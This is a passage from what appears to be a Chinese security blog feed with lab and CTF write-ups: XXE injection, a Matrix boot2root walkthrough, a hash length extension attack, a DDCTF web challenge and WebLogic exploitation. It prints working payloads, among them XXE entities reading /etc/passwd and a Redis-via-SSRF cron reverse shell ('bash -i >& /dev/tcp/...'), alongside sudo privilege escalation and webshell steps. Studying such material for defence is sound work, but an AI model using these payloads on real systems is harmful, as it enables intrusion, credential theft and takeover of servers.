<p><strong>XXE</strong>即<strong>XML</strong>外部实体注入，<strong>XXE</strong>漏洞发生在应用程序解析<strong>XML</strong>输入时，<strong>XML</strong>文件的解析依赖于<strong>libxml</strong>库(<strong>libxml2.9</strong>之前的版本默认开启了对外部实体的引用)。</p>
<p>服务端在解析用户提交的<strong>XML</strong>文件时，未对XML文件引用的外部实体(外部一般实体和外部实体参数)做合适的处理，并且实体的<strong>URL</strong>支持<strong>file://</strong>和<strong>ftp:/</strong>/等协议，导致可加载恶意外部文件和代码，造成任意文件读取，命令执行，内网端口扫描等危害。</p>
<p><strong>XXE</strong>漏洞触发点往往是可以上传xml文件的位置，没有为上传的<strong>xml</strong>文件进行过滤，导致可上传恶意<strong>xml</strong>文件。</p>
<a id="more"></a></li>
<li><p><strong>XML介绍：</strong></p>
<p><strong>XML</strong>是一种扩展标记语言，用于标记电子文件使其具有结构性，可以用来标记数据，定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言。<strong>XML</strong>使用<strong>DTD</strong>文档类型定义组织数据，非常适合<strong>Web</strong>传输。</p>
<ul>
<li><p>DTD文档类型定义</p>
<p><strong>DTD</strong>的作用是定义<strong>XML</strong>文档的合法构建模块。<strong>DTD</strong>可以在<strong>XML</strong>文档内声明，也可以在外部声明。</p>
<p><img src="/images/XXE_lab/1.jpg" alt="1"></p>
<ol>
<li><p><strong>内部声明</strong><code>&lt;!DOCTYPE   根元素   [元素声明]  &gt;</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;                   XML声明</span><br><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">  &lt;!ELEMENT note (to,from,heading,body)&gt;</span><br><span class="line">  &lt;!ELEMENT to      (#PCDATA)&gt;</span><br><span class="line">  &lt;!ELEMENT from    (#PCDATA)&gt;           文档定义类型</span><br><span class="line">  &lt;!ELEMENT heading (#PCDATA)&gt;</span><br><span class="line">  &lt;!ELEMENT body    (#PCDATA)&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">  &lt;to&gt;George&lt;&#x2F;to&gt;</span><br><span class="line">  &lt;from&gt;John&lt;&#x2F;from&gt;                        文档元素</span><br><span class="line">  &lt;heading&gt;Reminder&lt;&#x2F;heading&gt;</span><br><span class="line">  &lt;body&gt;Don&#39;t forget the meeting!&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;note&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>外部声明(引用外部DTD)</strong><code>&lt;!DOCTYPE 根元素 SYSTEM &quot;文件名&quot;&gt;</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note SYSTEM &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;note.dtd&quot;&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">&lt;to&gt;George&lt;&#x2F;to&gt;</span><br><span class="line">&lt;from&gt;John&lt;&#x2F;from&gt;</span><br><span class="line">&lt;heading&gt;Reminder&lt;&#x2F;heading&gt;</span><br><span class="line">&lt;body&gt;Don&#39;t forget the meeting!&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;note&gt; </span><br><span class="line"> </span><br><span class="line">#http:&#x2F;&#x2F;127.0.0.1&#x2F;note.dtd的内容为</span><br><span class="line">&lt;!ELEMENT note (to,from,heading,body)&gt;</span><br><span class="line">&lt;!ELEMENT to (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT from (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT heading (#PCDATA)&gt;</span><br></pre></td></tr></table></figure>
</li>
</ol>
</li>
</ul>
</li>
<li><p><strong>构建外部实体</strong></p>
<ol>
<li><p><strong>直接通过DTD外部实体声明</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE a[</span><br><span class="line">    &lt;!ENTITY b SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;a&gt;&amp;b;&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>通过DTD外部实体引入外部DTD文档，再引入外部实体声明（一般实体）</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE a [</span><br><span class="line">       &lt;!ENTITY b SYSTEM &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;evil.dtd&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;a&gt;&amp;b;&lt;&#x2F;a&gt;</span><br><span class="line"> </span><br><span class="line">#http:&#x2F;&#x2F;127.0.0.1&#x2F;evil.dtd内容为</span><br><span class="line">&lt;!ENTITY b SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>通过DTD外部实体引入外部DTD文档，再引入外部实体声明（参数实体）</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE a [</span><br><span class="line">    &lt;!ENTITY %b SYSTEM &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;evil.dtd&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;a&gt;%b;&lt;&#x2F;a&gt;</span><br><span class="line"> </span><br><span class="line">#http:&#x2F;&#x2F;127.0.0.1&#x2F;evil.dtd文件内容</span><br><span class="line">&lt;!ENTITY b SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;</span><br></pre></td></tr></table></figure>
</li>
</ol>
</li>
<li><p><strong>漏洞演示</strong>：</p>
<p>利用<a href="https://github.com/c0ny1/xxe-lab" target="_blank" rel="noopener">XXE-lab</a>来演示漏洞</p>
<ul>
<li><p>搭建好环境后访问，在登陆时抓包</p>
<p><img src="/images/XXE_lab/2.jpg" alt="2"></p>
<p>发现在登陆时允许解析XML内容。</p>
</li>
<li><p>验证该漏洞，发送如下请求</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE a [</span><br><span class="line"> 	&lt;!ENTITY  xxe SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;c:&#x2F;windows&#x2F;win.ini&quot;&gt;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/images/XXE_lab/3.jpg" alt="3"></p>
<p>可以读到<code>win.ini</code>文件，故漏洞存在</p>
</li>
</ul>
</li>
<li><p><strong>防御</strong></p>
<p><strong>XML</strong>解析库在调用时严格禁止对外部实体的解析。</p>
<ol>
<li>使用开发语言提供的禁用外部实体的方法。</li>
<li>对用户提交的<strong>XML</strong>内容进行过滤，如<strong>&lt;!DOCTYPE  和  &lt;!ENTITY</strong>  。</li>
</ol>
</li>
</ul>
]]></content>
      <categories>
        <category>漏洞</category>
      </categories>
      <tags>
        <tag>XXE</tag>
      </tags>
  </entry>
  <entry>
    <title>Matrix靶机测试</title>
    <url>/2019/07/21/Machine_Matrix_v3/</url>
    <content><![CDATA[<ul>
<li><strong>简介：</strong></li>
</ul>
<p>机器细节：Matrix是MATRIX机器的中级boot2root挑战系列。OVA已在VMware和Virtual Box上进行了测试。</p>
<p>标志：你的目标是获得root并阅读/root/flag.txt</p>
<p>网络：DHCP：启用的IP地址：自动分配</p>
<p>提示：遵循你的直觉……并列举！</p>
<a id="more"></a>

<ul>
<li><p><strong>扫描</strong></p>
<ul>
<li><p><code>使用工具：netdiscover,nmap</code></p>
<p><img src="/images/Machine_Matrix_v3/1.jpg" alt="1"></p>
<p>找到靶机的<strong>IP</strong>地址为<code>192.168.1.195</code></p>
<!--more--></li>
<li><p>使用<strong>Nmap</strong>对端口进行扫描</p>
<p><img src="/images/Machine_Matrix_v3/2.jpg" alt="2"></p>
<p>可以观察到有三个端口开放</p>
</li>
</ul>
</li>
<li><p><strong>对端口逐一测试</strong></p>
<ul>
<li><p>首先是<strong>80</strong>端口，尝试在浏览器中打开<strong>IP</strong>地址，但并未发现游泳的信息。<img src="/images/Machine_Matrix_v3/3.jpg" alt="3"></p>
<ul>
<li><p>使用<code>dirsearch</code>扫描目录<img src="/images/Machine_Matrix_v3/4.jpg" alt="4"></p>
<p>发现一个<code>/assets/目录</code>，在<code>/assets/img/</code>目录下发现了一个名为<code>Matrix_can-show-you-the-door.png</code>的图片<img src="/images/Machine_Matrix_v3/5.jpg" alt="5">图片内容为一只白色的兔子，正好与之前的80端口的标题<code>Follow the white rabbit</code>对应。<img src="/images/Machine_Matrix_v3/6.jpg" alt="6"></p>
</li>
<li><p>根据图片名字的提示将<code>Matrix</code>作为目录名字得到了更多的提示<img src="/images/Machine_Matrix_v3/7.jpg" alt="7">)由于<code>Matrix</code>电影（黑客帝国）中主角演员的名字为<code>neo</code>所以将<strong>neo</strong>作为路径名，只有<strong>4</strong>和<strong>6</strong>俩个数字所以将其组合尝试，找到了<code>secret.gz</code>文件。<img src="/images/Machine_Matrix_v3/8.jpg" alt="8">)经查看改文件其实为<code>txt</code>文件，包含了用户名和密码<img src="/images/Machine_Matrix_v3/9.jpg" alt="9"></p>
<p>对密码进行<code>md5</code>解密得到<code>passwd</code>，在扫描端口时发现<code>7331</code>端口下的是一个受身份验证保护的服务，猜测刚刚的到账号密码可能会派上用场。</p>
</li>
</ul>
</li>
<li><p>查看<code>7331</code>端口下的内容</p>
<ul>
<li><p>使用刚刚的账号密码成功登陆 <img src="/images/Machine_Matrix_v3/10.jpg" alt="10"></p>
<p>又是一个提示的页面</p>
<p><img src="/images/Machine_Matrix_v3/11.jpg" alt="11"></p>
<ul>
<li>再次使用<code>dirb</code>扫描目录</li>
</ul>
<p><img src="/images/Machine_Matrix_v3/12.jpg" alt="12"></p>
<p>在文件目录中发现了一个名为<code>data</code>的文件</p>
<p><img src="/images/Machine_Matrix_v3/14.jpg" alt="14"></p>
<ul>
<li>在<strong>ida</strong>中打开<strong>data</strong>文件，发现一个用户名和密码<br><img src="/images/Machine_Matrix_v3/15.jpg" alt="15"></li>
</ul>
</li>
</ul>
</li>
<li><p>猜测可能为<code>6464</code>端口上运行的<strong>SSH</strong>服务的账号和密码，尝试登陆</p>
<ul>
<li><p><img src="/images/Machine_Matrix_v3/16.jpg" alt="16"></p>
<p>但是在发现是一个受到限制的<strong>shell(rbash)</strong>，所以此处需要运行带有<strong>noprofile</strong>扩展的<strong>ssh</strong></p>
<blockquote>
<p><strong>rbash</strong>限制任何启动文件被读取后执行。</p>
</blockquote>
</li>
<li><p>ssh <a href="mailto:guest@192.168.1.195">guest@192.168.1.195</a> -p 6464 -t “bash –noprofile”</p>
<p><img src="/images/Machine_Matrix_v3/17.jpg" alt="17"></p>
<p>在该<strong>shell</strong>中可以执行<strong>sudo</strong>命令</p>
</li>
<li><p>检查<strong>guest</strong>用户的<strong>sudo</strong>权限，我们发现该用户可以使用其他用户<strong>trinity</strong>权限运行<strong>/ bin / cp</strong></p>
<p><img src="/images/Machine_Matrix_v3/23.jpg" alt="23"></p>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<ul>
<li><p><strong>提权</strong></p>
<ul>
<li><p>我们需要做的是创建一个新的<strong>ssh</strong>密钥，为<strong>id_rsa.pub</strong>文件提供了读写执行权限，然后将其复制到相应的位置。</p>
<p><img src="/images/Machine_Matrix_v3/18.jpg" alt="18"></p>
</li>
</ul>
</li>
</ul>
<ul>
<li><p>利用<strong>sudo</strong>权限复制<strong>/home/trinity/.ssh/authorized_keys</strong>文件夹中的<strong>id_rsa.pub</strong>文件，然后可以使用<strong>id_rsa</strong>键访问<code>trinity</code>用户的<strong>ssh</strong></p>
<p><img src="/images/Machine_Matrix_v3/19.jpg" alt="19"></p>
</li>
<li><p>检查<code>trinity</code>的<strong>sudo</strong>权限时发现它可以执行具有<strong>root</strong>权限的<strong>oracle</strong>文件。、</p>
<p><img src="/images/Machine_Matrix_v3/20.jpg" alt="20"></p>
<p>但是在<code>/home/trinity/</code>目录中并没有名为<code>oracle</code>的文件，因此我们使用<strong>echo</strong>命令创建带有<strong>/bin/sh</strong>的<strong>oracle</strong>文件</p>
<p><img src="/images/Machine_Matrix_v3/21.jpg" alt="21"></p>
</li>
<li><p>使用<strong>sudo</strong>命令执行<strong>oracle</strong>文件，得到<strong>root shell</strong></p>
<p><img src="/images/Machine_Matrix_v3/22.jpg" alt="22"></p>
</li>
</ul>
]]></content>
      <tags>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>hash_attacks</title>
    <url>/2019/07/10/hash_attacks/</url>
    <content><![CDATA[<ul>
<li><p><strong>哈希长度扩展攻击简介：</strong></p>
<p><strong>MAC</strong>用来验证信息的真实性，一般的<strong>MAC</strong>算法为：服务器把<strong>secret</strong>和<strong>message</strong>连接到一起，然后用消息摘要算法如<strong>MD5</strong>或<strong>SHA1</strong>等提取摘要。</p>
<p>在哈希摘要算法中，如<strong>MD5,SHA1,SHA2</strong>，都是基于<code>Merkle-Damgard</code>结构。这类算法存在一个问题，在知道hash(secret+message)的值及secret的长度的情况下，可以推算出<code>hash(secret+massage||padding||random)</code>(random为任意数据，||为连接符可以为空，<strong>padding</strong>是<strong>secret</strong>后的填充字节。<strong>hash</strong>的<strong>padding</strong>字节包含整个消息的长度，因此要计算出<strong>padding</strong>的值，<strong>secret</strong>的长度是必不可少的。</p>
<a id="more"></a>
<p>在填空之后，服务器算出的原始的hash值，正好与添加扩展字符串并覆盖初始链变量所计算出来的一样。攻击者的哈希计算过程，相当于从服务器计算过程的一半继续进行下去，因此提交hash值可以通过验证。</p>
<p>哈希长度扩展攻击主要针对于某些包含额外信息的加密散列函数。</p>
</li>
<li><p><strong>MD5加密过程：</strong></p>
<p>MD5加密过程中<strong>64</strong>个字节<strong>(512bits)</strong>为一组，属于分组加密，而且在运算的过程中将<strong>512</strong>比特分为<code>32bit*16</code>块，分块运算。关键在于利用MD5的填充，对加密的字符进行填充（第一位为1，其余位为0），使二进制补位长度为512的倍数减去<strong>64</strong>，最后的<strong>64</strong>位再补充为原来的字符串长度，这样刚好补满<strong>512</strong>的倍数，如果当前明文正好是<strong>512</strong>的倍数则再加上一个<strong>512bit</strong>的一组。在<strong>MD5</strong>加密中，每一块加密得到的密文作为下一次加密的初始向量。</p>
</li>
<li><p>例题：</p>
<p>源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$secret=<span class="string">"XXXXXXXXXXXXXXX"</span>; <span class="comment">// This secret is 15 characters long for security!</span></span><br><span class="line">$username=<span class="string">"admin"</span>;</span><br><span class="line">$password = $_POST[<span class="string">"password"</span>];</span><br><span class="line"><span class="keyword">if</span>($COOKIE[<span class="string">"getmein"</span>] === md5($secret . urldecode($username . $password)))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Congratulations! You are a registered user.\n"</span>;</span><br><span class="line">    <span class="keyword">die</span> (<span class="string">"The flag is "</span>. $flag);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"Your cookies don't match up! STOP HACKING THIS SITE."</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>在题目中可以得到<code>md5($secret . urldecode($username . $password)))</code>的值</p>
<p>secrce为密文，长度为15位，后边加上一个<code>admin</code>则长度为20位，而数据也为admin，可以在<strong>cookie</strong>中看到，此时的哈希值</p>
<p><img src="/images/hash_attack/1.jpg" alt="1"></p>
<p>这时使用hashdump附加的数据至少在1位以上，会得到一个新的签名和填充的数据</p>
<p>将新的签名设置到cookie的getmein中，然后用post提交password即可</p>
<p><img src="/images/hash_attack/2.jpg" alt="2"></p>
<p>从\x80开始位我们主动的填充，知道末尾的admin前的\x00为止，算上secret刚好15字节</p>
</li>
</ul>
]]></content>
      <categories>
        <category>漏洞</category>
      </categories>
      <tags>
        <tag>hash</tag>
      </tags>
  </entry>
  <entry>
    <title>ddctf</title>
    <url>/2019/06/11/DDCTF/</url>
    <content><![CDATA[<h4 id="0x00-前言："><a href="#0x00-前言：" class="headerlink" title="0x00 前言："></a>0x00 前言：</h4><p>DDCTF 由 滴滴出行信息安全部 主办，属于个人闯关类型 CTF 比赛。比赛已经结束，但我想再做一下这些题，总结一下。</p>
<p>比赛入口地址：<a href="https://ddctf.didichuxing.com/" target="_blank" rel="noopener">https://ddctf.didichuxing.com/</a></p>
<a id="more"></a>
<h4 id="0x01-Web-滴"><a href="#0x01-Web-滴" class="headerlink" title="0x01: Web - 滴~"></a>0x01: Web - 滴~</h4><p>访问题目链接，跳转到<code>http://117.51.150.246/index.php?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09</code></p>
<p>观察参数<code>jpg</code>可能是某种编码，再经过两次<strong>Base64</strong>后得到<code>666C61672E6A7067</code>,再对其进行<strong>Hex</strong>解码，得到了<code>flag.jpg</code>，所以猜测这里应该存在<strong>任意文件读取</strong>。</p>
<p>所以以同样的方式构造参数<code>index.php</code>为<code>TmprMlJUWTBOalUzT0RKRk56QTJPRGN3</code>，在对<code>img</code>标签中的字符做<code>Base64</code>解码后得到<code>index.php</code>。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * https://blog.csdn.net/FengBanLiuYun/article/details/80616607</span></span><br><span class="line"><span class="comment"> * Date: July 4,2018</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">error_reporting(E_ALL || ~E_NOTICE);</span><br><span class="line"></span><br><span class="line">header(<span class="string">'content-type:text/html;charset=utf-8'</span>);</span><br><span class="line"><span class="keyword">if</span>(! <span class="keyword">isset</span>($_GET[<span class="string">'jpg'</span>]))</span><br><span class="line">    header(<span class="string">'Refresh:0;url=./index.php?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09'</span>);</span><br><span class="line">$file = hex2bin(base64_decode(base64_decode($_GET[<span class="string">'jpg'</span>])));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;title&gt;'</span>.$_GET[<span class="string">'jpg'</span>].<span class="string">'&lt;/title&gt;'</span>;</span><br><span class="line">$file = preg_replace(<span class="string">"/[^a-zA-Z0-9.]+/"</span>,<span class="string">""</span>, $file);</span><br><span class="line"><span class="keyword">echo</span> $file.<span class="string">'&lt;/br&gt;'</span>;</span><br><span class="line">$file = str_replace(<span class="string">"config"</span>,<span class="string">"!"</span>, $file);</span><br><span class="line"><span class="keyword">echo</span> $file.<span class="string">'&lt;/br&gt;'</span>;</span><br><span class="line">$txt = base64_encode(file_get_contents($file));</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;img src='data:image/gif;base64,"</span>.$txt.<span class="string">"'&gt;&lt;/img&gt;"</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Can you find the flag file?</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>在代码中发现读取文件的字符只允许是<code>a-zA-Z0-9</code>,且<code>config</code>被替换为<code>!</code></p>
<p>访问源码中的连接，看到一篇<strong>命令echo</strong>的文章，还有他的另一篇<strong>vim 异常退出 swp文件提示</strong>，该文章提到了<strong>Linux</strong>下的临时文件</p>
<blockquote>
<p>例如第一次产生一个.practice.txt.swp，再次意外退出后，将会产生名为.practice.txt.swo的交换文件；而第三次产生的交换文件则为“.practice.txt.swn”；依此类推。</p>
</blockquote>
<p>经过尝试发现可以访问到<code>practice.txt.swp</code>文件</p>
<p><img src="/images/ddctf/1.png" alt="1"></p>
<p>由<code>index.php</code>中对读取字符的限制可得知，<code>f1ag!ddctf.php</code>实际上是<code>f1agconfigddctf.php</code>，利用相同的编码方式再次构造参数<code>TmpZek1UWXhOamMyTXpabU5tVTJOalk1TmpjMk5EWTBOak0zTkRZMk1tVTNNRFk0TnpBPQ==</code></p>
<p>得到<code>config.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">'config.php'</span>);</span><br><span class="line">$k = <span class="string">'hello'</span>;</span><br><span class="line">extract($_GET);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($uid))</span><br><span class="line">&#123;</span><br><span class="line">    $content=trim(file_get_contents($k));</span><br><span class="line">    <span class="keyword">if</span>($uid==$content)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">echo</span> $flag;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">echo</span><span class="string">'hello'</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>在该代码中存在<code>extract()</code>函数，推测存在变量覆盖漏洞。</p>
<p><img src="/images/ddctf/2.png" alt="2"></p>
<p>所以构造<strong>Payload</strong>为：<code>f1ag!ddctf.php?k=php://input&amp;uid=</code></p>
<blockquote>
<p><strong>php://input</strong>是个可以访问请求的原始数据的只读流。可以接收post请求作为输入流的输入，将请求作为<strong>PHP</strong>代码的输入传递给目标变量，以达到以post 的形式进行输入的目的。</p>
</blockquote>
<p>得到<strong>flag：</strong><code>DDCTF{436f6e67726174756c6174696f6e73}</code></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>Weblogic 安全测试</title>
    <url>/2019/05/24/Weblogic/</url>
    <content><![CDATA[<h4 id="0x0简介："><a href="#0x0简介：" class="headerlink" title="0x0简介："></a>0x0简介：</h4><p><strong>WebLogic</strong>是美国<a href="https://baike.baidu.com/item/Oracle" target="_blank" rel="noopener">Oracle</a>公司出品的一个<strong>application server</strong>，确切的说是一个基于<strong>JAVAEE</strong>架构的<a href="https://baike.baidu.com/item/%E4%B8%AD%E9%97%B4%E4%BB%B6/452240" target="_blank" rel="noopener">中间件</a>，<strong>WebLogic</strong>是用于开发、集成、部署和管理大型分布式<strong>Web</strong>应用、网络应用和<a href="https://baike.baidu.com/item/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%BA%94%E7%94%A8/10563731" target="_blank" rel="noopener">数据库应用</a>的<strong>Java</strong><a href="https://baike.baidu.com/item/%E5%BA%94%E7%94%A8%E6%9C%8D%E5%8A%A1%E5%99%A8" target="_blank" rel="noopener">应用服务器</a>。将<strong>Java</strong>的动态功能和<strong>Java Enterprise</strong>标准的安全性引入大型网络应用的开发、集成、部署和管理之中。</p>
<a id="more"></a>

<h4 id="0x01：管理员登录页面弱密码"><a href="#0x01：管理员登录页面弱密码" class="headerlink" title="0x01：管理员登录页面弱密码"></a>0x01：管理员登录页面弱密码</h4><p><strong>Weblogic</strong>的端口一般为<code>7001,7002</code></p>
<p>弱口令一般为：</p>
<blockquote>
<p>weblogic </p>
<p>Oracle@123 </p>
</blockquote>
<p>可以采用intruder爆力破解，成功后即可上传<strong>war</strong>包<strong>getshell</strong></p>
<p><img src="/images/Weblogic/1.jpg" alt="1"></p>
<h4 id="0x02：Weblogic-SSRF漏洞"><a href="#0x02：Weblogic-SSRF漏洞" class="headerlink" title="0x02：Weblogic SSRF漏洞"></a>0x02：Weblogic SSRF漏洞</h4><p><strong>Weblogic</strong>中存在一个SSRF漏洞，利用该漏洞可以发送任意<strong>HTTP</strong>请求，进而攻击内网中<strong>redis、fastcgi</strong>等脆弱组件。</p>
<p><strong>SSRF</strong>漏洞存在<code>http://your-ip:7001/uddiexplorer/SearchPublicRegistries.jsp</code></p>
<p>在<strong>Burp</strong>中测试该漏洞</p>
<ul>
<li>向服务器发送<strong>GET</strong>请求：</li>
</ul>
<p><code>?rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&amp;operator=http://127.0.0.1:7001</code></p>
<p><img src="/images/Weblogic/2.png" alt="2"></p>
<ul>
<li><p>若发送一个不存在的端口：</p>
<p><img src="/images/Weblogic/3.png" alt="3"></p>
<p>返回值为：<img src="/images/Weblogic/4.png" alt="4"></p>
</li>
<li><p>可以通过返回的信息不同，来判断端口开放的状态。</p>
</li>
</ul>
<ol>
<li><p><strong>存在的IP地址：</strong><img src="/images/Weblogic/2.png" alt="2"></p>
</li>
<li><p><strong>不存在的IP地址：</strong></p>
<p><img src="/images/Weblogic/5.png" alt="5"></p>
</li>
</ol>
<ol start="3">
<li><p><strong>存在IP但没有打开的端口：</strong><img src="/images/Weblogic/4.png" alt="4"></p>
</li>
<li><p><strong>存在IP且端口也存在：</strong></p>
<p><img src="/images/Weblogic/2.png" alt="2"></p>
</li>
</ol>
<p><img src="/images/Weblogic/9.png" alt="9"></p>
<ul>
<li><strong>注入HTTP头，利用Redis反弹shell：</strong></li>
</ul>
<p>Weblogic的SSRF有一个比较大的特点，其虽然是一个“GET”请求，但是我们可以通过传入<code>%0a%0d</code>来注入换行符，而某些服务（如redis）是通过换行符来分隔每条命令，也就说我们可以通过该SSRF攻击内网中的redis服务器。</p>
<p>首先，通过ssrf探测内网中的redis服务器（docker环境的网段一般是172.*），发现<code>172.18.0.2:6379</code>可以连通：</p>
<p>其返回值符合端口可联通的特征：</p>
<p><img src="/images/Weblogic/6.png" alt="6"></p>
<ol>
<li><p>发送<strong>Redis</strong>命令，将反弹shell的脚本写入<code>/etc/crontab/</code></p>
<blockquote>
<p><strong>set 1 “\n\n\n\n* * * * * root bash -i &gt;&amp; /dev/tcp/() 0&gt;&amp;1\n\n\n\n”</strong><br><strong>config set dir /etc/</strong><br><strong>config set dbfilename crontab</strong><br><strong>save</strong></p>
</blockquote>
<p><strong>crond</strong>是<strong>linux</strong>下用来周期性的执行某种任务或等待处理某些事件的一个守护进程,<strong>crond</strong>进程每分钟会定期检查是否有要执行的任务，如果有要执行的任务，则自动执行该任务。</p>
</li>
<li><p>进行<strong>URL</strong>编码后将 其放在<strong>SSRF</strong>的域名后，使用<strong>GET</strong>方式发送该数据后即可获得<strong>shell</strong></p>
<p><strong>换行符是“\r\n”，也就是“%0D%0A”</strong></p>
<p><img src="/images/Weblogic/7.png" alt="7"></p>
</li>
<li><p>对于crond利用：</p>
</li>
</ol>
<blockquote>
<p>/etc/crontab 这个是肯定的</p>
<p>/etc/cron.d/* 将任意文件写到该目录下，效果和crontab相同，格式也要和/etc/crontab相同。漏洞利用这个目录，可以做到不覆盖任何其他文件的情况进行弹shell。</p>
<p>/var/spool/cron/root centos系统下root用户的cron文件</p>
<p>/var/spool/cron/crontabs/root debian系统下root用户的cron文件</p>
</blockquote>
<ul>
<li><p><strong>修复建议：</strong></p>
<ul>
<li>升级Weblogic或者将SearchPublicRegistries.jsp删除或重命名</li>
<li>删除uddiexplorer文件夹或者对其进行访问限制（内网访问）</li>
<li>过滤返回信息，验证远程服务器对请求的响应</li>
<li>黑名单内网IP，避免应用被用来获取内网数据</li>
<li>统一错误信息</li>
</ul>
</li>
</ul>
<h4 id="0x03：Weblogic-任意文件读取漏洞"><a href="#0x03：Weblogic-任意文件读取漏洞" class="headerlink" title="0x03：Weblogic 任意文件读取漏洞"></a><strong>0x03：Weblogic 任意文件读取漏洞</strong></h4><p>在该环境中访问<code>http://your-ip:7001/hello/file.jsp?path=/etc/passwd</code>即可成功读取<strong>password</strong>文件</p>
<p><img src="/images/Weblogic/8.png" alt="8"></p>
<p>以下是对该漏洞的进一步利用。</p>
<ul>
<li><strong>读取后台用户密文与密钥文件：</strong></li>
</ul>
<p><strong>weblogic</strong>密码使用<strong>AES</strong>（老版本<strong>3DES</strong>）加密，对称加密可解密，只需要找到用户的密文与加密时的密钥即可。这两个文件均位于<code>base_domain</code>下，名为``SerializedSystemIni.dat<code>和</code>config.xml<code>,在当前测试环境中为</code>./security/SerializedSystemIni.dat<code>和</code>./config/config.xml<code>（基于当前目录</code>/root/Oracle/Middleware/user_projects/domains/base_domain`）。</p>
<p><code>SerializedSystemIni.dat</code>是一个二进制文件，所以为了避免引入一些干扰字符，需要使用<strong>Burp</strong>来读取</p>
<p><code>config.xml</code>是<strong>base_domain</strong>的全局配置文件，所以乱七八糟的内容比较多，找到其中的<code>&lt;node-manager-password-encrypted&gt;</code>的值，即为加密后的管理员密码。</p>
<ul>
<li>然后解密密文，即可登陆后台上传<strong>Webshell</strong></li>
</ul>
<p>在部署上传<strong>War</strong>包时，可以将<strong>Webshell</strong>放到<code>web/hello.war/</code>这个压缩包中。</p>
<p><strong>war</strong>包制作方法<code>jar -cvf test.war ./test/*</code></p>
<ul>
<li>获取<strong>Webshell</strong></li>
</ul>
<h4 id="Weblogic-任意文件上传漏洞（CVE-2018-2894"><a href="#Weblogic-任意文件上传漏洞（CVE-2018-2894" class="headerlink" title="Weblogic 任意文件上传漏洞（CVE-2018-2894)"></a>Weblogic 任意文件上传漏洞（CVE-2018-2894)</h4><p>Web Service Test Page 在“生产模式”下默认不开启，所以该漏洞有一定限制。利用该漏洞，可以上传任意jsp文件，进而获取服务器权限。</p>
<ul>
